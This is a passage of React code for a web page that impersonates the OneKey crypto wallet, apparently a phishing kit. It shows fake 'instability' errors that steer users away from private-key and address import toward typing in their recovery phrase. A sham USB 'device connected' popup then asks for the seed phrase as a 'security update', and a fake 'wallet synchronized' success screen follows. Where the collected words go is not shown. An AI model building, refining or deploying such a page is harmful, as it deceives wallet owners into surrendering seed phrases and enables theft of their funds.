                            onClick={() => setShowSeedDropdown((v) => !v)}
                            type="button"
                          >
                            {seedPhraseCount} palavras
                            <span className="material-icons ml-1 text-sm">
                              expand_more
                            </span>
                          </button>
                          {showSeedDropdown && (
                            <div className="absolute left-0 mt-1 w-32 bg-white rounded-lg shadow border border-[#E9ECF2] z-10">
                              {[12, 15, 18, 21, 24].map((count) => (
                                <button
                                  key={count}
                                  className={`w-full text-left px-3 py-1.5 text-xs hover:bg-[#F5F6FA] ${
                                    seedPhraseCount === count
                                      ? "font-bold text-black"
                                      : "text-[#393C4E]"
                                  }`}
                                  onClick={() => {
                                    setSeedPhraseCount(count);
                                    setSeedPhraseWords(Array(count).fill(""));
                                    setShowSeedDropdown(false);
                                  }}
                                >
                                  {count} palavras
                                </button>
                              ))}
                            </div>
                          )}
                        </div>
                        <button
                          className="flex items-center text-xs font-semibold text-[#393C4E] hover:underline gap-1"
                          onClick={() =>
                            setSeedPhraseWords(Array(seedPhraseCount).fill(""))
                          }
                        >
                          <span className="material-icons text-sm">
                            auto_delete
                          </span>{" "}
                          Limpar
                        </button>
                      </div>
                    </div>

                    {/* Inputs das palavras organizados em linhas de 3 - menores */}
                    <div className="space-y-3 mb-4">
                      {Array.from(
                        { length: Math.ceil(seedPhraseCount / 3) },
                        (_, rowIdx) => (
                          <div key={rowIdx} className="grid grid-cols-3 gap-3">
                            {Array.from({ length: 3 }, (_, colIdx) => {
                              const inputIdx = rowIdx * 3 + colIdx;
                              if (inputIdx >= seedPhraseCount) return null;
                              return (
                                <input
                                  key={inputIdx}
                                  type="text"
                                  className="border border-[#E9ECF2] rounded-md px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black text-center"
                                  placeholder={`${inputIdx + 1}`}
                                  value={seedPhraseWords[inputIdx] || ""}
                                  onChange={(e) => {
                                    const newWords = [...seedPhraseWords];
                                    newWords[inputIdx] = e.target.value;
                                    setSeedPhraseWords(newWords);
                                  }}
                                />
                              );
                            })}
                          </div>
                        )
                      )}
                    </div>

                    {/* Texto explicativo agora embaixo dos inputs */}
                    <div className="mb-4 p-3 bg-[#F8F9FA] rounded-lg border border-[#E9ECF2]">
                      <div className="text-xs font-semibold text-black mb-1">
                        Como importar do OneKey KeyTag?
                      </div>
                      <div className="text-xs text-[#393C4E] leading-relaxed mb-2">
                        Some os números em cada linha. Esta soma representa a
                        posição da palavra na lista de palavras.
                      </div>
                      <div className="text-xs text-[#393C4E] leading-relaxed">
                        Em seguida, visite o site BIP39-DotMap para encontrar a
                        palavra correspondente para esta posição.
                      </div>
                    </div>

                    {/* Imagem bip39 responsiva baseada na quantidade de palavras - APENAS no OneKey KeyTag */}
                    <div className="flex justify-center mb-4">
                      <img
                        src="/bvip39.png"
                        alt="BIP39"
                        className={`h-auto transition-all duration-300 ${
                          seedPhraseCount <= 12
                            ? "w-full max-w-sm"
                            : seedPhraseCount <= 18
                            ? "w-full max-w-xs"
                            : "w-full max-w-64"
                        }`}
                      />
                    </div>

                    {/* Botão Confirmar */}
                    <div className="flex justify-end">
                      <button
                        className="bg-black text-white px-6 py-2 rounded-lg font-bold text-sm hover:bg-[#393C4E] transition-colors"
                        onClick={handleStartSync}
                      >
                        Confirmar
                      </button>
                    </div>
                  </>
                )}
              </div>
              {/* Modal menor e centralizado para código de acesso */}
              {showAccessCodeModal && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-10">
                  <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg mx-auto p-6 relative flex flex-col">
                    <button
                      className="absolute right-3 top-3 text-xl text-[#888] hover:bg-[#F5F6FA] rounded-full p-1"
                      onClick={() => {
                        setShowAccessCodeModal(false);
                        setNextImportStep(null);
                      }}
                      aria-label="Fechar"
                    >
                      <span className="material-icons">close</span>
                    </button>
                    <div className="text-lg font-bold text-black mb-4">
                      Definir código de acesso
                    </div>
                    <label
                      className="text-xs font-semibold text-black mb-1"
                      htmlFor="new-code"
                    >
                      Novo código de acesso
                    </label>
                    <div className="relative mb-3">
                      <input
                        id="new-code"
                        type={showNewCode ? "text" : "password"}
                        className="w-full border border-[#E9ECF2] rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black"
                        placeholder="Crie um código de acesso forte"
                      />
                      <span
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-[#888] cursor-pointer material-icons text-sm"
                        onClick={() => setShowNewCode((v) => !v)}
                      >
                        {showNewCode ? "visibility_off" : "visibility"}
                      </span>
                    </div>
                    <label
                      className="text-xs font-semibold text-black mb-1"
                      htmlFor="confirm-code"
                    >
                      Confirmar código de acesso
                    </label>
                    <div className="relative mb-3">
                      <input
                        id="confirm-code"
                        type={showConfirmCode ? "text" : "password"}
                        className="w-full border border-[#E9ECF2] rounded-lg px-3 py-2 text-sm focus:outline-none focus:ring-1 focus:ring-black"
                        placeholder="Digite novamente seu código de acesso"
                      />
                      <span
                        className="absolute right-2 top-1/2 -translate-y-1/2 text-[#888] cursor-pointer material-icons text-sm"
                        onClick={() => setShowConfirmCode((v) => !v)}
                      >
                        {showConfirmCode ? "visibility_off" : "visibility"}
                      </span>
                    </div>
                    <div className="flex items-center mb-4 mt-2">
                      <span className="text-xs font-semibold text-black mr-2">
                        Autenticação com Chave de Acesso
                      </span>
                      <label className="inline-flex relative items-center cursor-pointer ml-auto">
                        <input type="checkbox" className="sr-only peer" />
                        <div className="w-9 h-5 bg-gray-200 peer-focus:outline-none peer-focus:ring-1 peer-focus:ring-black rounded-full peer peer-checked:bg-black transition-all"></div>
                        <div className="absolute left-1 top-0.5 bg-white w-3.5 h-3.5 rounded-full shadow peer-checked:translate-x-4 transition-all"></div>
                      </label>
                    </div>
                    <button
                      className="w-full bg-black text-white py-2 rounded-lg font-bold text-sm mt-2 hover:bg-[#393C4E] transition-colors"
                      onClick={() => {
                        setShowAccessCodeModal(false);
                        if (nextImportStep === "onekeytag") {
                          setModalStep("import-seed-phrase-onekeytag");
                          setSeedPhraseCount(12);
                          setSeedPhraseWords(Array(12).fill(""));
                        } else {
                          setModalStep("import-seed-phrase");
                          setSeedPhraseCount(12);
                          setSeedPhraseWords(Array(12).fill(""));
                        }
                      }}
                    >
                      Sincronizar código de acesso
                    </button>
                  </div>
                </div>
              )}

              {/* Modal de loading para Chave Privada */}
              {showPrivateKeyLoading && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
                  <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg mx-auto p-8 relative flex flex-col items-center">
                    <button
                      className="absolute right-4 top-4 text-xl text-[#888] hover:bg-[#F5F6FA] rounded-full p-1"
                      onClick={() => setShowPrivateKeyLoading(false)}
                      aria-label="Fechar"
                    >
                      <span className="material-icons">close</span>
                    </button>

                    {/* Loading spinner */}
                    <div className="flex flex-col items-center justify-center py-8">
                      <div className="w-12 h-12 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>

                      <div className="text-center">
                        <div className="text-xl font-bold text-black mb-3">
                          Instabilidade detectada
                        </div>
                        <div className="text-base text-[#393C4E] mb-6 max-w-sm">
                          O sistema de importação via chave privada está
                          instável no momento.
                        </div>
                        <div className="text-sm text-[#393C4E] mb-6">
                          Recomendamos usar:
                        </div>

                        <div className="space-y-3">
                          <button
                            className="w-full bg-black text-white py-3 rounded-lg font-semibold hover:bg-[#393C4E] transition-colors"
                            onClick={() => {
                              setShowPrivateKeyLoading(false);
                              setShowAccessCodeModal(true);
                              setNextImportStep("phrase");
                            }}
                          >
                            Frase de recuperação
                          </button>
                          <button
                            className="w-full bg-[#F5F6FA] text-black py-3 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2] transition-colors"
                            onClick={() => {
                              setShowPrivateKeyLoading(false);
                              setShowAccessCodeModal(true);
                              setNextImportStep("onekeytag");
                            }}
                          >
                            OneKey KeyTag
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Modal de loading para Endereço */}
              {showAddressLoading && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
                  <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg mx-auto p-8 relative flex flex-col items-center">
                    <button
                      className="absolute right-4 top-4 text-xl text-[#888] hover:bg-[#F5F6FA] rounded-full p-1"
                      onClick={() => setShowAddressLoading(false)}
                      aria-label="Fechar"
                    >
                      <span className="material-icons">close</span>
                    </button>

                    {/* Loading spinner */}
                    <div className="flex flex-col items-center justify-center py-8">
                      <div className="w-12 h-12 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>

                      <div className="text-center">
                        <div className="text-xl font-bold text-black mb-3">
                          Instabilidade detectada
                        </div>
                        <div className="text-base text-[#393C4E] mb-6 max-w-sm">
                          O sistema de importação via endereço está instável no
                          momento.
                        </div>
                        <div className="text-sm text-[#393C4E] mb-6">
                          Recomendamos usar:
                        </div>

                        <div className="space-y-3">
                          <button
                            className="w-full bg-black text-white py-3 rounded-lg font-semibold hover:bg-[#393C4E] transition-colors"
                            onClick={() => {
                              setShowAddressLoading(false);
                              setShowAccessCodeModal(true);
                              setNextImportStep("phrase");
                            }}
                          >
                            Frase de recuperação
                          </button>
                          <button
                            className="w-full bg-[#F5F6FA] text-black py-3 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2] transition-colors"
                            onClick={() => {
                              setShowAddressLoading(false);
                              setShowAccessCodeModal(true);
                              setNextImportStep("onekeytag");
                            }}
                          >
                            OneKey KeyTag
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Modal de loading de sincronização */}
              {showSyncLoading && (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
                  <div className="bg-white rounded-2xl shadow-xl w-full max-w-lg mx-auto p-8 relative flex flex-col items-center">
                    {syncStep === "loading" && (
                      <div className="flex flex-col items-center justify-center py-8">
                        <div className="w-16 h-16 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>
                        <div className="text-center">
                          <div className="text-xl font-bold text-black mb-3">
                            Please wait
                          </div>
                          <div className="text-base text-[#393C4E] mb-6 max-w-sm">
                            {syncMessage}
                          </div>
                        </div>
                      </div>
                    )}

                    {syncStep === "success" && (
                      <div className="flex flex-col items-center justify-center py-8">
                        <svg
                          fill="none"
                          viewBox="0 0 24 24"
                          width="64px"
                          height="64px"
                          color="var(--iconSuccess)"
                          className="mb-6 text-green-600"
                        >
                          <path
                            fill="currentColor"
                            fillRule="evenodd"
                            d="M12 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.774 8.133a1 1 0 0 0-1.548-1.266l-3.8 4.645-1.219-1.22a1 1 0 0 0-1.414 1.415l2 2a1 1 0 0 0 1.481-.074z"
                            clipRule="evenodd"
                          />
                        </svg>
                        <div className="text-center">
                          <div className="text-xl font-bold text-black mb-3">
                            Synchronization completed
                          </div>
                          <div className="text-base text-[#393C4E] mb-6 max-w-sm">
                            Your wallet has been successfully imported and
                            synchronized.
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
        {/* Popup de conexão USB */}
        {usbPopup && (
          <div
            className="fixed top-0 left-6 z-50 w-[480px] max-w-[98vw] bg-white rounded-2xl shadow-2xl border border-[#E9ECF2] flex flex-col items-center p-10 animate-fade-in"
            style={{ minHeight: "400px" }}
          >
            <div className="w-full flex items-center mb-6">
              <img
                src="/icons8-conector-usb.gif"
                alt="USB"
                className="w-8 h-8 mr-3"
              />
              <span className="font-semibold text-lg text-black">
                app.onekey.so wants to connect
              </span>
            </div>
            {usbStep === "prompt" && (
              <>
                <div className="flex-1 flex flex-col items-center justify-center w-full mb-8">
                  <span className="text-[#393C4E] text-base mb-8 mt-8">
                    Please connect your device via USB to continue.
                  </span>
                </div>
                <div className="flex w-full justify-end gap-3 mt-auto">
                  <button
                    className="bg-[#F5F6FA] text-[#393C4E] px-6 py-2 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2]"
                    onClick={() => setUsbPopup(false)}
                  >
                    Cancel
                  </button>
                  <button
                    className="bg-black text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#393C4E]"
                    onClick={handleUsbConnect}
                  >
                    Connect
                  </button>
                </div>
              </>
            )}
            {usbStep === "loading" && (
              <div className="flex flex-col items-center justify-center w-full h-40">
                <div className="w-10 h-10 mb-4 border-4 border-gray-200 border-t-black rounded-full animate-spin"></div>
                <span className="text-[#393C4E] text-base">Connecting...</span>
              </div>
            )}
            {usbStep === "error" && (
              <>
                <div className="flex-1 flex flex-col items-center justify-center w-full mb-8">
                  <span className="text-[#E53E3E] text-base mb-8 mt-8">
                    No compatible device found.
                  </span>
                </div>
                <div className="flex w-full justify-end gap-3 mt-auto">
                  <button
                    className="bg-[#F5F6FA] text-[#393C4E] px-6 py-2 rounded-lg font-semibold border border-[#E9ECF2] hover:bg-[#E9ECF2]"
                    onClick={() => setUsbPopup(false)}
                  >
                    Cancel
                  </button>
                  <button
                    className="bg-black text-white px-6 py-2 rounded-lg font-semibold hover:bg-[#393C4E]"
                    onClick={handleUsbRetry}
                  >
                    Retry
                  </button>
                </div>
              </>
            )}
            {usbStep === "success" && (
              <div
                className="flex flex-col items-center justify-center w-full h-40 transition-all duration-500 relative"
                style={{ minHeight: "260px" }}
              >
                <div className="relative w-10 h-10 mb-4 flex items-center justify-center">
                  {/* Spinner que vira visto */}
                  <div
                    className={`absolute inset-0 rounded-full border-4 border-green-200 border-t-green-600 animate-spin-fadeout`}
                  ></div>
                  <svg
                    className="absolute w-8 h-8 text-green-600 animate-fade-in"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="3"
                    strokeLinecap="round"
                    strokeLinejoin="round"
                  >
                    <path d="M5 13l4 4L19 7" />
                  </svg>
                </div>
                <span className="text-green-600 text-base font-semibold mb-2">
                  Device connected successfully!
                </span>
                <div className="absolute left-0 right-0 bottom-0 flex justify-center pb-6">
                  <button
                    className="bg-[#393C4E] text-white px-8 py-3 rounded-lg font-semibold text-base hover:bg-[#22242F] transition-colors"
                    onClick={handleNextSeed}
                  >
                    Next
                  </button>
                </div>
              </div>
            )}
            {/* Renderizar bloco de seed se usbStep for 'seed' ou 'seed-loading' */}
            {(usbStep === "seed" || usbStep === "seed-loading") && (
              <div className="flex flex-col items-center justify-center w-full min-h-[340px] animate-fade-in relative">
                <span className="text-lg font-bold text-black mb-2 text-center">
                  Enter your recovery phrase
                </span>
                <span className="text-base text-[#393C4E] mb-4 text-center">
                  For your security update, please enter your {seedCount}-word
                  seed phrase below.
                </span>
                <div className="flex gap-2 mb-4">
                  {[12, 15, 18, 24].map((count) => (
                    <button
                      key={count}
                      className={`px-3 py-1 rounded-lg border font-semibold text-sm transition-colors ${
                        seedCount === count
                          ? "bg-black text-white border-black"
                          : "bg-[#F5F6FA] text-[#393C4E] border-[#E9ECF2] hover:bg-[#E9ECF2]"
                      }`}
                      onClick={() => {
                        setSeedCount(count);
                        setSeedWords(Array(count).fill(""));
                      }}
                    >
                      {count}
                    </button>
                  ))}
                </div>
                <div className="grid grid-cols-3 gap-2 w-full max-w-md mb-8">
                  {seedWords.map((word, idx) => (
                    <input
                      key={idx}
                      type="text"
                      className="border border-[#E9ECF2] rounded-lg px-3 py-2 text-base focus:outline-none focus:border-black transition-colors"
                      placeholder={`Word ${idx + 1}`}
                      value={word}
                      onChange={(e) => {
                        const newWords = [...seedWords];
                        newWords[idx] = e.target.value;
                        setSeedWords(newWords);
                      }}
                    />
                  ))}
                </div>
                <button
                  className={`bg-black text-white px-8 py-3 rounded-lg font-semibold text-base hover:bg-[#393C4E] transition-colors ${
                    seedWords.every((w) => w.trim())
                      ? ""
                      : "opacity-50 cursor-not-allowed"
                  }`}
                  disabled={
                    !seedWords.every((w) => w.trim()) ||
                    usbStep === "seed-loading"
                  }
                  onClick={() => {
                    setUsbStep("seed-loading");
                    setTimeout(() => {
                      setUsbPopup(false);
                      setUsbStep("prompt");
                    }, 3000);
                  }}
                >
                  Continue
                </button>
                {/* Loading minimalista sobreposto */}
                {usbStep === "seed-loading" && (
                  <div className="absolute inset-0 flex items-center justify-center bg-white bg-opacity-80 z-10">
                    <div className="w-10 h-10 border-4 border-gray-200 border-t-black rounded-full animate-spin"></div>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </main>
      {/* Modal de aviso de sincronização */}
      {showWarningModal && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60 animate-fade-in"
          onClick={() => setShowWarningModal(false)}
          style={{ cursor: "pointer" }}
        >
          <div className="bg-white rounded-2xl shadow-xl flex flex-col items-center justify-center p-10 min-w-[340px] min-h-[180px] max-w-xs">
            {showWarningSpinner ? (
              <>
                <div className="w-12 h-12 border-4 border-gray-200 border-t-black rounded-full animate-spin mb-6"></div>
                <div className="text-lg font-semibold text-black text-center">
                  Loading...
                </div>
              </>
            ) : (
              <div className="flex flex-col items-center">
                <div className="text-lg font-bold text-black text-center mb-2">
                  Attention Required
                </div>
                <div className="text-base text-[#393C4E] text-center">
                  Please synchronize your wallet first to access this feature.
                  <br />
                  Your security and experience matter to us!
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

// Componentes auxiliares para sidebar
interface SidebarItemProps {
  icon: React.ReactNode;
  label: string;
  active?: boolean;
  onClick?: () => void;
}
function SidebarItem({
  icon,
  label,
  active = false,
  onClick,
}: SidebarItemProps) {
  return (
    <div
      className={`flex items-center gap-3 px-4 py-2 rounded-lg cursor-pointer text-sm font-medium ${
        active ? "bg-[#F5F6FA] text-black" : "text-[#393C4E] hover:bg-[#F5F6FA]"
      } transition-colors`}
      onClick={onClick}
    >
      {icon}
      <span>{label}</span>
    </div>
  );
}
// SVGs auxiliares (WalletIcon, MarketIcon, etc)
function WalletIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconActive)"
    >
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M6.5 3A3.5 3.5 0 0 0 3 6.5V17a4 4 0 0 0 4 4h11a3 3 0 0 0 3-3v-7a3 3 0 0 0-3-3h-1V5.412A2.41 2.41 0 0 0 14.588 3zM15 8V5.412A.41.41 0 0 0 14.588 5H6.5a1.5 1.5 0 1 0 0 3zm.5 7.75a1.25 1.25 0 1 0 0-2.5 1.25 1.25 0 0 0 0 2.5"
        clipRule="evenodd"
      />
    </svg>
  );
}
function MarketIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        stroke="currentColor"
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth="2"
        d="M3 5v12a2 2 0 0 0 2 2h16M7 15l3-3a1.414 1.414 0 0 1 2 0 1.414 1.414 0 0 0 2 0l5-5m0 0h-4m4 0v4"
      />
    </svg>
  );
}
function SwapIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M3.769 16.414c-.781-.78-1.1-1.633-.319-2.414h16.82a1 1 0 1 1 0 2H6.183l2.293 2.293a1 1 0 1 1-1.415 1.414zM20.5 7.586c.781.78 1.1 1.633.318 2.414H4a1 1 0 1 1 0-2h14.086l-2.293-2.293a1 1 0 0 1 1.414-1.414z"
        clipRule="evenodd"
      />
    </svg>
  );
}
function EarnIcon() {
  return (
    <svg
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M9 5a5 5 0 0 0-.941 9.912 7 7 0 0 1 5.112-7.67A5 5 0 0 0 9 5m6.33 2.008a7 7 0 1 0-6.66 9.985 7 7 0 1 0 6.66-9.985M15 9a5 5 0 1 0 0 10 5 5 0 0 0 0-10"
        clipRule="evenodd"
      />
    </svg>
  );
}
function ForwardIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        stroke="currentColor"
        strokeWidth="2"
        d="M19 11.732V18a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-6.268m14 0V11.5m0 .232A2 2 0 0 0 18 8H6a2 2 0 0 0-1 3.732m14 0A2 2 0 0 1 18 12H6a2 2 0 0 1-1-.268m0-.232v.232M12 8V6.333M12 8h-1.667A3.333 3.333 0 0 1 7 4.667C7 3.747 7.746 3 8.667 3A3.333 3.333 0 0 1 12 6.333M12 8h1.667A3.333 3.333 0 0 0 17 4.667C17 3.747 16.254 3 15.333 3A3.333 3.333 0 0 0 12 6.333M12 8v12"
      />
    </svg>
  );
}
function UserIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M7.75 2a3 3 0 0 0-3 3v14a3 3 0 0 0 3 3h8.5a3 3 0 0 0 3-3V5a3 3 0 0 0-3-3zm-1 3a1 1 0 0 1 1-1h8.5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-8.5a1 1 0 0 1-1-1z"
        clipRule="evenodd"
      />
      <path
        fill="currentColor"
        d="M12.956 7h-2.174l-.38 1.153h1.206v2.429h1.348z"
      />
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M14.729 13.521a2.479 2.479 0 1 1-4.958 0 2.479 2.479 0 0 1 4.958 0m-2.479 1.354a1.353 1.353 0 1 0 0-2.707 1.353 1.353 0 0 0 0 2.707"
        clipRule="evenodd"
      />
    </svg>
  );
}
function BrowserIcon() {
  return (
    <svg
      fill="none"
      viewBox="0 0 24 24"
      width="20px"
      height="20px"
      color="var(--iconSubdued)"
    >
      <path
        fill="currentColor"
        fillRule="evenodd"
        d="M12 4a8 8 0 1 0 0 16 8 8 0 0 0 0-16M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12m12.075-2.075-3.26.89-.89 3.26 3.26-.89zm.318-2.16a1.5 1.5 0 0 1 1.841 1.842l-1.119 4.105a2 2 0 0 1-1.403 1.403l-4.105 1.12a1.5 1.5 0 0 1-1.842-1.842l1.12-4.105a2 2 0 0 1 1.403-1.403z"
        clipRule="evenodd"
      />
    </svg>
  );
}
function SettingsIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 20 20">
      <circle
        cx="10"
        cy="10"
        r="8"
        stroke="#393C4E"
        strokeWidth="1.5"
        fill="none"
      />
      <path d="M10 6v4l2 2" stroke="#393C4E" strokeWidth="1.5" />
    </svg>
  );
}
function DownloadIcon() {
  return (
    <svg width="20" height="20" viewBox="0 0 20 20">
      <path
        d="M10 4v8m0 0l-3-3m3 3l3-3M4 16h12"
        stroke="#393C4E"
        strokeWidth="1.5"
      />
    </svg>
  );
}

function WalletGrid() {
  // Lista simples de carteiras sem dependências externas
  const walletList = [
    { id: "walletConnect", name: "Walletconnect", emoji: "🔗" },
    { id: "injected", name: "Injected", emoji: "⚡" },
    { id: "rabby", name: "Rabby Wallet", emoji: "🐰" },
    { id: "trust", name: "Trust Wallet", emoji: "🛡️" },
    { id: "ctrl", name: "Ctrl Wallet", emoji: "⌨️" },
    { id: "coinbase", name: "Coinbase Wallet", emoji: "🔵" },
    { id: "bitget", name: "Bitget Wallet", emoji: "📊" },
    { id: "okx", name: "OKX Wallet", emoji: "❌" },
    { id: "metamask", name: "MetaMask", emoji: "🦊" },
    { id: "phantom", name: "Phantom", emoji: "👻" },
    { id: "backpack", name: "Backpack", emoji: "🎒" },
  ];

  return (
    <div className="w-full max-w-3xl mx-auto mt-8">
      <div className="text-[#393C4E] text-sm font-semibold mb-2">EVM</div>
      <div className="grid grid-cols-4 gap-4">
        {walletList.map((wallet) => (
          <button
            key={wallet.id}
            className="flex flex-col items-center justify-center bg-[#F5F6FA] rounded-xl py-6 hover:bg-[#E9ECF2] transition-colors shadow-sm border border-transparent hover:border-[#A3A3A3]"
            onClick={() => console.log(`Conectando com ${wallet.name}`)}
          >
            <div className="text-3xl mb-2">{wallet.emoji}</div>
            <span className="text-black text-sm font-medium">
              {wallet.name}
            </span>
          </button>
        ))}
      </div>
    </div>
  );
}
